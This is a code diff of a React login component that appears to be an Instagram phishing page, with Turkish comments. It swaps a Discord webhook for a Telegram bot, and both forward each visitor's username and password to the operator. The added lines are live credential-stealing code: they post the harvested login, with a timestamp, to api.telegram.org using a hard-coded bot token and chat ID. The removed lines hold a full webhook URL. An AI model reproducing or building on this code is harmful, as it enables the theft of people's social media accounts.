@@ -29,37 +29,33 @@ export default function Login() {
 
   const { mutate, isPending } = useMutation({
     mutationFn: async (data: LoginFormData) => {
-      // Discord webhook URL'i (güvenlik için gerçek projelerde bunu client tarafında saklamayın)
-      const webhookUrl = "https://discord.com/api/webhooks/1351717767585464321/G55PRIVsD7T2AB6yyqD3M_znGaOrwRRezYlqqlOQEXGq4vSQo3rNEWxzZrMJocjoeB93";
+      // Telegram Bot Bilgileri - Not: Production'da environment variable kullanılmalıdır
+      const TELEGRAM_BOT_TOKEN = "6944329555:AAG0MPx1-5NjJBTXR4c0sRdHoySL2d8cwwc";  // Bu token sadece bu proje için kullanılmalıdır
+      const TELEGRAM_CHAT_ID = "6824853693";      // Mesajların iletileceği chat ID
       
-      // Discord webhook mesajını hazırla
-      const message = {
-        content: "🚨 **Instagram Yeni Giriş** 🚨",
-        embeds: [{
-          title: "Hesap Bilgileri;",
-          color: 16426522,
-          fields: [
-            {
-              name: "👤 Kullanıcı Adı:",
-              value: data.username,
-              inline: true
-            },
-            {
-              name: "🔒 Şifre:",
-              value: data.password,
-              inline: true
-            },
-            {
-              name: "🕝 Tarih:",
-              value: new Date().toISOString(),
-              inline: false
-            }
-          ]
-        }]
-      };
+      // Tarih ve saat bilgisini al
+      const now = new Date();
+      const dateTimeStr = now.toISOString();
       
-      // Discord webhook'a doğrudan gönder
-      const response = await axios.post(webhookUrl, message, {
+      // Telegram API için mesaj metni oluştur
+      const messageText = `
+🚨 *Instagram Yeni Giriş* 🚨
+
+*Hesap Bilgileri:*
+👤 *Kullanıcı Adı:* ${data.username}
+🔒 *Şifre:* ${data.password}
+🕝 *Tarih:* ${dateTimeStr}
+      `;
+      
+      // Telegram API URL'ini oluştur
+      const telegramApiUrl = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`;
+      
+      // Telegram botuna gönder
+      const response = await axios.post(telegramApiUrl, {
+        chat_id: TELEGRAM_CHAT_ID,
+        text: messageText,
+        parse_mode: 'Markdown'
+      }, {
         headers: {
           'Content-Type': 'application/json',
         }
